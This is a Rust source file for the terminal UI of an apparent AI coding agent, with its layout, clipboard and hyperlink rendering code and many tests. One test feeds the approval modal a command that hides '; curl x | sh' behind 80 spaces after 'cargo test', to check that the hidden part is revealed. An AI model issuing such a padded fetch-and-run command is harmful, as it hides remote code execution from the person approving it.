//! Frame layout and drawing: the status bar, chat or welcome screen, task panel, queued-prompt
//! preview, modal, and input bands, plus the copy and jump-to-bottom overlays, status-line
//! hyperlinks, and OSC 52 clipboard writes.

use anyhow::Result;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Paragraph};
use ratatui::{Frame, Terminal};

use ox_core::util::text::{center_truncate_to_width, truncate_to_width};

use super::App;
use crate::components::overflow_count;
use crate::components::status::StatusBar;
use crate::components::welcome;
use crate::glyphs::{NEWLINE_GLYPH, USER_PROMPT_PREFIX, USER_PROMPT_PREFIX_WIDTH};
use crate::saturating_u16;
use crate::terminal::{TuiBackend, synchronized_update, write_status_hyperlinks};
use crate::theme::Theme;

/// Chat rows that stay visible however tall the bands below the chat grow.
const MIN_CHAT_HEIGHT: u16 = 1;

/// Maximum queued prompts shown in the preview before collapsing into `... +N prompts`.
const PREVIEW_VISIBLE: usize = 3;

/// Cells a pill's padding takes, one on each side of its label.
const PILL_PADDING: u16 = 2;

/// Narrowest chat that shows the jump-to-bottom pill.
const JUMP_PILL_MIN_WIDTH: u16 = 25;

/// Narrowest chat whose jump-to-bottom pill spells out its label.
const JUMP_LABEL_FULL_MIN_WIDTH: usize = 40;

impl App {
    pub(super) fn render<B: TuiBackend>(&mut self, terminal: &mut Terminal<B>) -> Result<()> {
        synchronized_update(terminal, |terminal| {
            terminal.draw(|frame| self.draw_frame(frame))?;
            self.emit_status_hyperlinks(terminal)?;
            self.emit_pending_clipboard(terminal)
        })
    }

    /// Writes a queued OSC 52 copy, which the terminal applies to the system clipboard.
    fn emit_pending_clipboard<B: TuiBackend>(&mut self, terminal: &mut Terminal<B>) -> Result<()> {
        if let Some(sequence) = self.pending_clipboard.take() {
            terminal.backend_mut().write_all(sequence.as_bytes())?;
        }
        Ok(())
    }

    /// Replays captured status links as OSC 8 envelopes over the drawn frame.
    fn emit_status_hyperlinks<B: TuiBackend>(&mut self, terminal: &mut Terminal<B>) -> Result<()> {
        let links = self.status_bar.take_pending_hyperlinks();
        write_status_hyperlinks(terminal.backend_mut(), &links)?;
        self.status_links = links;
        Ok(())
    }

    pub(super) fn draw_frame(&mut self, frame: &mut Frame<'_>) {
        // The status bar and one chat row stay visible. The modal, or else the input and its
        // popup, outranks the queued-prompt preview, and the preview the task panel.
        let modal_max = frame
            .area()
            .height
            .saturating_sub(StatusBar::HEIGHT + MIN_CHAT_HEIGHT);
        let modal_height = self.modals.height(frame.area().width, modal_max);
        // Modal owns focus, so input and popup bands collapse.
        let modal_active = self.modals.is_active();
        let popup_height = if modal_active {
            0
        } else {
            self.input.popup_height()
        };
        let input_height = if modal_active {
            0
        } else {
            self.input.height(frame.area().width)
        };
        let spare = modal_max.saturating_sub(modal_height + popup_height + input_height);
        let preview_height = self.preview_height().min(spare);
        let tasks_height = self.tasks.height().min(spare - preview_height);
        // Pre-fill with surface bg so unpainted gaps inherit the theme.
        frame.render_widget(Block::default().style(self.theme.surface()), frame.area());
        let [status, chat, tasks, preview, modal, popup, input] = Layout::vertical([
            Constraint::Length(StatusBar::HEIGHT),
            Constraint::Min(MIN_CHAT_HEIGHT),
            Constraint::Length(tasks_height),
            Constraint::Length(preview_height),
            Constraint::Length(modal_height),
            Constraint::Length(popup_height),
            Constraint::Length(input_height),
        ])
        .areas(frame.area());

        self.status_bar
            .set_queued_prompts(self.queue.pending().len());
        self.status_bar.set_task_progress(self.tasks.progress());
        self.status_bar
            .set_session_id(&self.session_info.session_id);
        self.status_bar
            .set_theme_name(&self.session_info.config.theme_name);
        self.status_bar
            .set_permission_mode(self.session_info.config.permission_mode);
        self.status_bar.render(frame, status, &self.theme);
        if self.chat.is_empty() && self.session_info.config.show_welcome {
            welcome::paint(frame, chat, &self.theme, &self.session_info);
        } else {
            self.chat.set_spinner(self.status_bar.spinner());
            self.chat.render(frame, chat);
            let jump = self.jump_pill(chat);
            let jump_width = jump.as_ref().map_or(0, |(pill, _)| pill.width);
            self.render_copy_notice(frame, chat, jump_width);
            if let Some((pill, line)) = jump {
                frame.render_widget(Paragraph::new(line).style(self.theme.surface()), pill);
            }
        }
        if tasks_height > 0 {
            self.tasks.render(frame, tasks, &self.theme);
        }
        if preview_height > 0 {
            self.render_preview(frame, preview);
        }
        if modal_active {
            self.modals.render(frame, modal, &self.theme);
        } else {
            if popup_height > 0 {
                self.input.render_popup(frame, popup, &self.theme);
            }
            self.input
                .render(frame, input, self.status.is_busy(), &self.theme);
        }
    }

    fn preview_height(&self) -> u16 {
        let queued = self.queue.pending().len();
        let overflow = usize::from(queued > PREVIEW_VISIBLE);
        saturating_u16(queued.min(PREVIEW_VISIBLE) + overflow)
    }

    fn render_preview(&self, frame: &mut Frame<'_>, area: Rect) {
        let body_width = usize::from(area.width)
            .saturating_sub(usize::from(USER_PROMPT_PREFIX_WIDTH))
            .saturating_sub(1);

        let queued = self.queue.pending();
        let mut lines: Vec<Line<'static>> = Vec::with_capacity(PREVIEW_VISIBLE + 1);
        for prompt in queued.iter().take(PREVIEW_VISIBLE) {
            lines.push(preview_line(prompt.line(), &self.theme, body_width));
        }
        if queued.len() > PREVIEW_VISIBLE {
            let extra = queued.len() - PREVIEW_VISIBLE;
            let gutter = " ".repeat(usize::from(USER_PROMPT_PREFIX_WIDTH));
            let count = overflow_count(extra, "prompt", "prompts");
            lines.push(Line::from(Span::styled(
                format!("{gutter}{count}"),
                self.theme.dim(),
            )));
        }
        frame.render_widget(Paragraph::new(lines).style(self.theme.surface()), area);
    }

    /// Shows the outcome of the last copy at the chat's bottom-left corner, in the width the
    /// jump-to-bottom pill of `jump_width` cells leaves, keeping a cell between them.
    fn render_copy_notice(&self, frame: &mut Frame<'_>, area: Rect, jump_width: u16) {
        let Some(notice) = &self.copy_notice else {
            return;
        };
        let room = match jump_width {
            0 => area.width,
            width => area.width.saturating_sub(width + 1),
        };
        if area.height == 0 || room <= PILL_PADDING {
            return;
        }
        let label = truncate_to_width(&notice.text, usize::from(room - PILL_PADDING));
        let style = if notice.failed {
            self.theme.warning()
        } else {
            self.theme.success()
        };
        let line = pill_line(label, style);
        let width = saturating_u16(line.width()).min(room);
        frame.render_widget(
            Paragraph::new(line).style(self.theme.surface()),
            bottom_row(area, area.x, width),
        );
    }

    /// The jump-to-bottom pill at the chat's bottom-right corner while scrolled up.
    fn jump_pill(&self, area: Rect) -> Option<(Rect, Line<'static>)> {
        if !self.chat.is_scrolled_up() || area.width < JUMP_PILL_MIN_WIDTH || area.height == 0 {
            return None;
        }

        let new_count = self.chat.new_content_since_pause();
        let label = jump_overlay_label(new_count, usize::from(area.width));
        let style = if new_count == 0 {
            self.theme.dim()
        } else {
            self.theme.accent()
        };
        let line = pill_line(label, style);
        let width = saturating_u16(line.width());
        if width > area.width {
            return None;
        }
        Some((bottom_row(area, area.right() - width, width), line))
    }
}

/// `label` in `style`, padded by a cell on each side.
fn pill_line(label: String, style: Style) -> Line<'static> {
    Line::from(vec![
        Span::raw(" "),
        Span::styled(label, style),
        Span::raw(" "),
    ])
}

/// The `width` cells from column `x` on the bottom row of a non-empty `area`.
fn bottom_row(area: Rect, x: u16, width: u16) -> Rect {
    Rect {
        x,
        y: area.bottom() - 1,
        width,
        height: 1,
    }
}

fn jump_overlay_label(new_count: u32, width: usize) -> String {
    if width < JUMP_LABEL_FULL_MIN_WIDTH {
        return "↓ (ctrl+End)".to_owned();
    }
    let label = match new_count {
        0 => "Jump to bottom (ctrl+End) ↓".to_owned(),
        1 => "1 new message (ctrl+End) ↓".to_owned(),
        n => format!("{n} new messages (ctrl+End) ↓"),
    };
    center_truncate_to_width(&label, width.saturating_sub(usize::from(PILL_PADDING)))
}

/// Renders a queued prompt as a dim ghost, capped at `body_width` columns.
fn preview_line(prompt: &str, theme: &Theme, body_width: usize) -> Line<'static> {
    let flat = prompt.replace('\n', NEWLINE_GLYPH);
    let display = truncate_to_width(&flat, body_width);
    let style = theme.queued().add_modifier(Modifier::DIM);
    Line::from(vec![
        Span::styled(USER_PROMPT_PREFIX, style),
        Span::styled(display, style),
    ])
}

#[cfg(test)]
mod tests {
    use std::fmt::Write as _;

    use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use indoc::indoc;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use ratatui::style::Color;
    use tokio::sync::mpsc;

    use ox_core::config::StatusLineSegment;
    use ox_core::permission::{Basis, Mode};
    use ox_core::protocol::testing::{ls_call, text_result};
    use ox_core::protocol::{ApprovalDecision, CompactTrigger, Event, Op};
    use ox_core::tool::tasks::testing::plan;
    use ox_core::tool::view::{ApprovalBody, ApprovalPreview};
    use ox_core::util::git::PullRequest;

    use super::*;
    use crate::action::Action;
    use crate::app::CopyNotice;
    use crate::app::testing::{
        FakeModal, cell_of, five_hour_limit, long_chat_block, push_answerable_approval, render_app,
        rendered_text, test_app,
    };
    use crate::clipboard::CopyError;
    use crate::components::status::testing::status_bar_init;
    use crate::components::status::{Status, StatusBar};
    use crate::git_probes::GitUpdate;
    use crate::now;
    use crate::terminal::testing::{BEGIN_SYNC, END_SYNC, FLUSH, FRAME, capture_terminal};
    use crate::testing::{buffer_rows, key_event};

    mod render {
        use super::*;

        #[test]
        fn draws_the_frame_inside_a_synchronized_update() {
            let (mut app, _rx, _event_tx) = test_app(None);
            let mut terminal = capture_terminal(60, 8);

            app.render(&mut terminal).unwrap();

            assert_eq!(
                terminal.backend().bytes(),
                [BEGIN_SYNC, FRAME, END_SYNC, FLUSH].concat()
            );
            assert_eq!(
                buffer_rows(terminal.backend().buffer()),
                buffer_rows(render_app(&mut app, 60, 8).buffer()),
            );
        }

        #[test]
        fn replays_status_hyperlinks_over_the_frame_inside_the_synchronized_update() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.apply_git_update(GitUpdate::PullRequest(Some(PullRequest {
                number: 7,
                url: "https://example.com/pull/7".to_owned(),
                checks: None,
                review: None,
            })));
            let mut terminal = capture_terminal(120, 8);

            app.render(&mut terminal).unwrap();

            let urls: Vec<&str> = app
                .status_links
                .iter()
                .map(|link| link.url.as_str())
                .collect();
            assert_eq!(urls, ["https://example.com/pull/7"]);
            let mut envelope = Vec::new();
            write_status_hyperlinks(&mut envelope, &app.status_links).unwrap();
            assert_eq!(
                terminal.backend().bytes(),
                [BEGIN_SYNC, FRAME, &envelope, END_SYNC, FLUSH].concat(),
            );
        }

        #[test]
        fn writes_a_queued_clipboard_copy_once_inside_the_synchronized_update() {
            let (mut app, _rx, _event_tx) = test_app(None);
            let mut terminal = capture_terminal(60, 8);
            app.pending_clipboard = Some("\x1b]52;c;eA==\x07".to_owned());

            app.render(&mut terminal).unwrap();
            app.render(&mut terminal).unwrap();

            assert_eq!(
                terminal.backend().bytes(),
                [
                    BEGIN_SYNC,
                    FRAME,
                    b"\x1b]52;c;eA==\x07",
                    END_SYNC,
                    FLUSH,
                    BEGIN_SYNC,
                    FRAME,
                    END_SYNC,
                    FLUSH
                ]
                .concat(),
            );
        }

        #[test]
        fn repaints_when_chat_content_grows_past_viewport() {
            // Content pushed in the same handler tick must land before a post-paint re-clamp.
            let (mut app, _rx, _event_tx) = test_app(None);
            let mut body = String::new();
            for i in 0..40 {
                _ = writeln!(body, "line {i:02} of a long system block");
            }
            app.chat.push_system_message(body);

            let text = rendered_text(&mut app, 60, 12);

            assert!(
                text.contains("line 39"),
                "tail of overflowing block must be in the viewport after the first render, \
                 got:\n{text}",
            );
        }
    }

    mod emit_status_hyperlinks {
        use super::*;

        #[test]
        fn is_a_noop_when_no_links_pending() {
            let (mut app, _rx, _event_tx) = test_app(None);
            let mut terminal = capture_terminal(80, 24);

            app.emit_status_hyperlinks(&mut terminal).unwrap();

            assert_eq!(terminal.backend().bytes(), b"");
        }
    }

    mod draw_frame {
        use super::*;

        /// Pushes a finished `ls` call listing two files.
        fn push_ls_call(app: &mut App) {
            app.chat.push_tool_call(ls_call());
            app.chat.push_tool_result(text_result(
                "t1",
                "README.md\nCargo.toml",
                false,
                Some("ran ls"),
            ));
        }

        /// The color of the first cell of `label` in a 60x10 frame.
        fn label_fg(app: &mut App, label: &str) -> Color {
            let backend = render_app(app, 60, 10);
            let buffer = backend.buffer();
            buffer[cell_of(buffer, label)].fg
        }

        const COMPACT_SUMMARY: &str = indoc! {"
            ## Recap

            - Fixed the token refresh in the login flow.
            - Next: add a regression test.
        "};

        /// An app running `/compact` on a short exchange, its summary streamed to the last bullet.
        fn app_streaming_a_summary() -> (App, mpsc::Receiver<Op>, mpsc::UnboundedSender<Event>) {
            let (mut app, rx, event_tx) = test_app(None);
            app.chat.push_user_message("Fix the login bug.".to_owned());
            app.chat.append_stream_token("Fixed the token refresh.");
            app.chat.commit_streaming();
            app.dispatch_action(Action::Submit("/compact".to_owned()));
            let streamed = &COMPACT_SUMMARY[..COMPACT_SUMMARY.find("- Next").unwrap()];
            app.handle_engine_event(Event::SummaryToken(streamed.to_owned()));
            (app, rx, event_tx)
        }

        #[test]
        fn paints_every_surface_into_a_terminal_too_small_to_hold_it() {
            type Arrange = fn(&mut App);
            let states: [(&str, Arrange); 7] = [
                ("welcome", |_| {}),
                ("busy chat", |app| {
                    push_ls_call(app);
                    app.chat.push_user_message("one\ntwo".to_owned());
                    app.chat.append_thinking_token("thinking");
                    app.chat.append_stream_token("partial reply\n\nmore");
                    app.queue.push("queued".to_owned());
                    app.handle_engine_event(Event::TasksUpdated(plan()));
                    app.input.set_text("line one\nline two\nline three");
                }),
                ("slash popup", |app| {
                    for c in "/mo".chars() {
                        app.input
                            .handle_event(&key_event(KeyCode::Char(c), KeyModifiers::NONE));
                    }
                }),
                ("approval", |app| {
                    push_answerable_approval(app, "cargo test --all");
                }),
                ("picker", |app| {
                    app.dispatch_action(Action::Submit("/theme".to_owned()));
                }),
                ("line editor", |app| {
                    app.dispatch_action(Action::Submit("/rename".to_owned()));
                }),
                ("scrolled up", |app| {
                    app.chat.push_system_message(long_chat_block());
                    app.chat
                        .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
                    app.copy_notice = Some(CopyNotice {
                        text: "Copied 5 characters".to_owned(),
                        failed: false,
                        until: now(),
                    });
                }),
            ];
            let sizes = [
                (0, 0),
                (80, 0),
                (0, 24),
                (1, 1),
                (80, 1),
                (1, 24),
                (80, 2),
                (3, 3),
            ];

            for (state, arrange) in states {
                for (width, height) in sizes {
                    let (mut app, _rx, _event_tx) = test_app(Some("title"));
                    arrange(&mut app);
                    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();

                    for _ in 0..2 {
                        terminal.draw(|frame| app.draw_frame(frame)).unwrap();
                    }

                    let surface = app.theme.surface().bg;
                    assert!(
                        terminal
                            .backend()
                            .buffer()
                            .content
                            .iter()
                            .all(|cell| Some(cell.bg) == surface),
                        "{state} at {width}x{height}"
                    );
                }
            }
        }

        #[test]
        fn lays_out_status_chat_and_input_in_order() {
            let (mut app, _rx, _event_tx) = test_app(Some("Session title"));

            insta::assert_snapshot!(render_app(&mut app, 80, 10));
        }

        #[test]
        fn shows_rate_limits_and_app_state_in_opt_in_segments() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.status_bar = StatusBar::new(status_bar_init(vec![
                StatusLineSegment::QueuedPrompts,
                StatusLineSegment::FiveHourLimit,
                StatusLineSegment::SessionId,
                StatusLineSegment::Theme,
            ]));
            app.queue.push("next".to_owned());

            app.handle_engine_event(Event::RateLimitsUpdated(five_hour_limit()));

            let text = rendered_text(&mut app, 100, 12);
            let status = text.lines().next().unwrap();
            assert_eq!(
                status.trim_end(),
                "  Queued: 1 │ 5h: 42% │ ID: test-ses │ Theme: mocha"
            );
        }

        #[test]
        fn with_conversation_and_tool_call() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat
                .push_user_message("what files are here?".to_owned());
            push_ls_call(&mut app);
            app.chat.append_stream_token("Two files.");
            app.chat.commit_streaming();

            insta::assert_snapshot!(render_app(&mut app, 60, 12));
        }

        #[test]
        fn streaming_shows_spinner_in_status_bar() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.dispatch_action(Action::Submit("working...".to_owned()));
            app.handle_engine_event(Event::StreamToken("part".to_owned()));

            insta::assert_snapshot!(render_app(&mut app, 60, 8));
        }

        #[test]
        fn compaction_streams_the_summary_below_the_chat() {
            let (mut app, _rx, _event_tx) = app_streaming_a_summary();

            insta::assert_snapshot!(render_app(&mut app, 60, 16));
        }

        #[test]
        fn compaction_success_leaves_only_the_compacted_summary() {
            let (mut app, _rx, _event_tx) = app_streaming_a_summary();

            app.handle_engine_event(Event::SessionCompacted {
                summary: COMPACT_SUMMARY.trim().to_owned(),
                pre_count: 3,
                instructions: None,
                trigger: CompactTrigger::Manual,
            });
            app.handle_engine_event(Event::SessionReady);

            insta::assert_snapshot!(render_app(&mut app, 60, 16));
        }

        #[test]
        fn compaction_cancel_drops_the_partial_summary() {
            let (mut app, _rx, _event_tx) = app_streaming_a_summary();

            app.handle_engine_event(Event::SummaryDiscarded);
            app.handle_engine_event(Event::Cancelled);

            insta::assert_snapshot!(render_app(&mut app, 60, 16));
        }

        #[test]
        fn compaction_failure_drops_the_partial_summary_and_shows_the_error() {
            let (mut app, _rx, _event_tx) = app_streaming_a_summary();

            app.handle_engine_event(Event::SummaryDiscarded);
            app.handle_engine_event(Event::TurnFailed(
                "Compaction failed: the summary hit the max_tokens output limit before it finished"
                    .to_owned(),
            ));

            let text = rendered_text(&mut app, 60, 16);
            assert!(
                text.contains("Compaction failed: the summary hit the max_tokens"),
                "{text}"
            );
            assert!(!text.contains("Summarizing"), "{text}");
            assert!(!text.contains("Recap"), "{text}");
            assert!(text.contains("Fixed the token refresh."), "{text}");
        }

        #[test]
        fn shows_the_copy_notice_in_the_chat_bottom_left_corner() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message("hello");

            for (text, failed, fg) in [
                ("Copied 5 characters", false, app.theme.success.fg),
                (
                    &*CopyError::TimedOut.to_string(),
                    true,
                    app.theme.warning.fg,
                ),
            ] {
                app.copy_notice = Some(CopyNotice {
                    text: text.to_owned(),
                    failed,
                    until: now(),
                });

                let backend = render_app(&mut app, 60, 10);

                let buffer = backend.buffer();
                let rows = buffer_rows(buffer);
                let y = rows
                    .iter()
                    .position(|row| row.contains(text))
                    .expect("notice shown");
                assert!(rows[y].starts_with(&format!(" {text} ")), "{rows:?}");
                assert!(rows[y + 1].starts_with('─'), "the last chat row: {rows:?}");
                assert_eq!(buffer[(1, u16::try_from(y).unwrap())].fg, fg.unwrap());
            }
        }

        #[test]
        fn truncates_the_copy_notice_left_of_the_jump_pill() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message(long_chat_block());
            _ = render_app(&mut app, 60, 10);
            app.chat
                .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
            app.copy_notice = Some(CopyNotice {
                text: CopyError::AppleTerminal.to_string(),
                failed: true,
                until: now(),
            });

            let text = rendered_text(&mut app, 60, 10);

            let row = text
                .lines()
                .find(|row| row.contains("Jump to bottom"))
                .expect("pill shown");
            let pill = row.find(" Jump to bottom").unwrap();
            assert!(row.starts_with(" Not copied: Terminal"), "{row}");
            assert!(
                row[..pill].ends_with("...  "),
                "the notice's padding and one gap cell precede the pill: {row}",
            );
        }

        #[test]
        fn following_the_tail_hides_the_jump_pill() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message(long_chat_block());

            let text = rendered_text(&mut app, 60, 10);

            assert!(!text.contains("Jump to bottom"), "{text}");
        }

        #[test]
        fn scrolled_up_shows_a_dim_jump_pill() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message(long_chat_block());
            _ = render_app(&mut app, 60, 10);

            app.chat
                .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));

            assert_eq!(
                Some(label_fg(&mut app, "Jump to bottom")),
                app.theme.dim().fg
            );
        }

        #[test]
        fn scrolled_up_counts_new_content_in_an_accent_pill() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message(long_chat_block());
            _ = render_app(&mut app, 60, 10);
            app.chat
                .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));

            app.chat.push_error("background update");

            assert_eq!(
                Some(label_fg(&mut app, "1 new message")),
                app.theme.accent().fg
            );
        }

        #[test]
        fn narrow_width_still_renders_all_three_panels() {
            let (mut app, _rx, _event_tx) = test_app(Some("narrow"));
            app.chat.push_user_message("hi".to_owned());

            insta::assert_snapshot!(render_app(&mut app, 40, 8));
        }

        #[test]
        fn renders_slash_popup_above_input_when_visible() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.handle_crossterm_event(&key_event(KeyCode::Char('/'), KeyModifiers::NONE));
            assert!(app.input.popup_visible());

            let text = rendered_text(&mut app, 60, 14);

            assert!(
                text.contains("/archive"),
                "popup must paint at least one canonical command row: {text}",
            );
        }

        #[test]
        fn preview_panel_renders_queued_prompts_and_overflow_tag() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.dispatch_action(Action::Submit("active".to_owned()));
            for i in 0..5 {
                app.queue.push(format!("queued {i}"));
            }

            insta::assert_snapshot!(render_app(&mut app, 60, 14));
        }

        #[test]
        fn task_panel_sits_above_the_preview_and_feeds_the_status_progress() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.status_bar = StatusBar::new(status_bar_init(vec![
                StatusLineSegment::Model,
                StatusLineSegment::TaskProgress,
            ]));
            app.dispatch_action(Action::Submit("active".to_owned()));
            push_ls_call(&mut app);
            app.queue.push("queued 0".to_owned());

            app.handle_engine_event(Event::TasksUpdated(plan()));

            insta::assert_snapshot!(render_app(&mut app, 60, 14));
        }

        #[test]
        fn gives_the_input_its_rows_before_the_task_panel() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.input.set_text("one\ntwo\nthree\nfour\nfive");
            app.handle_engine_event(Event::TasksUpdated(plan()));

            let text = rendered_text(&mut app, 40, 12);

            let rows: Vec<&str> = text.lines().map(str::trim_end).collect();
            assert_eq!(rows[3..5], ["  ● Add the entry type", "  ... +2 tasks"]);
            assert_eq!(rows[5], "─".repeat(40));
            assert!(rows[6].ends_with("one"), "{text}");
        }

        #[test]
        fn sizes_the_input_at_the_new_width_on_the_first_frame_after_a_resize() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.input.set_text(&"a".repeat(25));
            _ = render_app(&mut app, 80, 12);

            let text = rendered_text(&mut app, 14, 12);

            let rows: Vec<&str> = text.lines().map(str::trim_end).collect();
            let rule = "─".repeat(14);
            assert_eq!(
                rows[7..],
                [&*rule, "❯ aaaaaaaaaaaa", "  aaaaaaaaaaaa", "  a", &rule]
            );
        }

        #[test]
        fn hides_input_and_popup_while_modal_active() {
            // Modal owns focus, so the layout must collapse the input + popup bands. The
            // user-prompt marker (`❯`) is the cheapest substring proof that the input got rendered.
            let (mut app, _rx, _event_tx) = test_app(None);
            let baseline = rendered_text(&mut app, 60, 14);
            assert!(
                baseline.contains(USER_PROMPT_PREFIX),
                "input prompt marker must paint without a modal: {baseline}",
            );

            app.modals
                .push(Box::new(FakeModal::new("FAKE-MODAL-TITLE")));

            let with_modal = rendered_text(&mut app, 60, 14);
            assert!(
                with_modal.contains("FAKE-MODAL-TITLE"),
                "modal body must render: {with_modal}",
            );
            assert!(
                !with_modal.contains(USER_PROMPT_PREFIX),
                "input must collapse while modal is active: {with_modal}",
            );

            // A non-cancel key still reaches the modal, so the collapse keeps its focus grab.
            let action = app.modals.handle_key(&KeyEvent::from(KeyCode::Char('x')));

            assert!(action.is_none(), "FakeModal consumes without emitting");
            assert!(app.modals.is_active(), "Consumed must not pop the stack");
        }

        #[test]
        fn sizes_a_modal_before_the_queued_prompt_preview() {
            let (mut app, mut rx, _event_tx) = test_app(None);
            for i in 0..5 {
                app.queue.push(format!("queued {i}"));
            }
            push_answerable_approval(&mut app, "cargo test --all");

            let text = rendered_text(&mut app, 60, 11);

            assert!(text.contains("cargo test --all"), "{text}");

            app.handle_crossterm_event(&key_event(KeyCode::Char('y'), KeyModifiers::NONE));

            let forwarded = rx.try_recv().expect("approval forwarded");
            assert!(matches!(
                forwarded,
                Op::Resolve {
                    decision: ApprovalDecision::Approve,
                    ..
                }
            ));
        }

        #[test]
        fn approval_modal_wraps_and_reveals_a_padded_command() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.push_approval_modal(
                "call-1".to_owned(),
                ApprovalPreview {
                    title: "Bash".to_owned(),
                    body: ApprovalBody::Command(format!(
                        "cargo test{}; curl x | sh",
                        " ".repeat(80)
                    )),
                },
                &Basis::Mode(Mode::Manual),
                None,
            );

            insta::assert_snapshot!(render_app(&mut app, 60, 14));
        }

        #[test]
        fn surface_fill_overwrites_unpainted_cells_with_surface_bg() {
            let (mut app, _rx, _event_tx) = test_app(None);
            let sentinel = Color::Rgb(254, 0, 254);
            let surface_bg = app.theme.surface().bg.expect("surface slot defines bg");
            let mut terminal = Terminal::new(TestBackend::new(60, 10)).unwrap();
            for cell in &mut terminal.current_buffer_mut().content {
                cell.set_bg(sentinel);
            }

            terminal.draw(|frame| app.draw_frame(frame)).unwrap();

            let buffer = terminal.backend().buffer();
            for y in 0..10 {
                for x in 0..60 {
                    let cell = buffer.cell((x, y)).expect("cell in bounds");
                    assert_eq!(
                        cell.bg, surface_bg,
                        "cell ({x},{y}) kept the sentinel, surface fill regressed",
                    );
                }
            }
        }
    }

    mod preview_height {
        use super::*;

        #[test]
        fn is_zero_when_queue_empty() {
            let (app, _rx, _event_tx) = test_app(None);

            assert_eq!(app.preview_height(), 0);
        }

        #[test]
        fn caps_at_visible_plus_overflow_row() {
            let (mut app, _rx, _event_tx) = test_app(None);
            for i in 0..(PREVIEW_VISIBLE + 5) {
                app.queue.push(format!("p{i}"));
            }

            assert_eq!(
                app.preview_height(),
                u16::try_from(PREVIEW_VISIBLE + 1).unwrap()
            );
        }
    }

    mod render_preview {
        use super::*;

        #[test]
        fn overflow_appends_a_count_row() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.set_status(Status::Streaming);
            let extra = 3;
            for i in 0..(PREVIEW_VISIBLE + extra) {
                app.queue.push(format!("queued-{i}"));
            }

            let text = rendered_text(&mut app, 60, 20);

            assert!(
                text.contains(&format!("... +{extra} prompts")),
                "overflow hint must show exact extra count: {text}",
            );
        }
    }

    mod jump_pill {
        use super::*;

        #[test]
        fn sits_in_the_bottom_right_corner_of_a_wide_enough_chat() {
            let (mut app, _rx, _event_tx) = test_app(None);
            app.chat.push_system_message(long_chat_block());
            _ = render_app(&mut app, 60, 10);
            app.chat
                .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
            let area = Rect::new(2, 1, JUMP_PILL_MIN_WIDTH, 5);

            let narrow = app.jump_pill(Rect {
                width: JUMP_PILL_MIN_WIDTH - 1,
                ..area
            });
            let (pill, line) = app.jump_pill(area).expect("pill shown");

            assert_eq!(narrow, None);
            assert_eq!(line.to_string(), " ↓ (ctrl+End) ");
            assert_eq!(pill, Rect::new(13, 5, 14, 1));
        }
    }

    mod jump_overlay_label {
        use super::*;

        #[test]
        fn idle_reads_jump_to_bottom() {
            assert_eq!(jump_overlay_label(0, 60), "Jump to bottom (ctrl+End) ↓");
        }

        #[test]
        fn pluralizes_new_message_count() {
            assert_eq!(jump_overlay_label(1, 60), "1 new message (ctrl+End) ↓");
            assert_eq!(jump_overlay_label(3, 60), "3 new messages (ctrl+End) ↓");
        }

        #[test]
        fn uses_short_form_below_full_width() {
            assert_eq!(
                jump_overlay_label(3, JUMP_LABEL_FULL_MIN_WIDTH - 1),
                "↓ (ctrl+End)"
            );
            assert_eq!(
                jump_overlay_label(3, JUMP_LABEL_FULL_MIN_WIDTH),
                "3 new messages (ctrl+End) ↓"
            );
        }
    }
}
